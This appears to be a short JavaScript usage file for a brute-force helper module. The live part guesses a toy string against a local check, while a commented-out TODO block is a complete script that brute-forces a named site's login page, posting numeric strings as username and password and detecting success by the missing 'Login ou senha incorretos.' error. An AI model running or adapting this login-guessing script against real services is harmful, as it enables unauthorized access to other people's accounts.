var bruteforce = require('./bruteforce');

bruteforce(
	'abc',
	function(possible, done){
		setTimeout(function() {
			done(possible == 'babaca');
		}, 1000);
	},
	function(right) { console.log('RIGHT:', right); });

//TODO

// var bruteforce = require('./bruteforce');
// var request = require('request');

// bruteforce(
// 	'0123456789',
// 	function(possible) {
// 		return possible.length > 12;
// 	},
// 	function(possible, done){
// 		request.post(
// 			'https://internet.hashtag.com.br/Account/Login',
// 			{
// 				form: {
// 					UserName: possible,
// 					Password: possible
// 				}
// 			},
// 			function (error, response, body) {
// 				if (!error && response.statusCode == 200) {
// 					done(body.indexOf('Login ou senha incorretos.') == -1);
// 				}
// 			}
// 		);
// 	},
// 	function(right) {
// 		console.log('RIGHT:', right);
// });

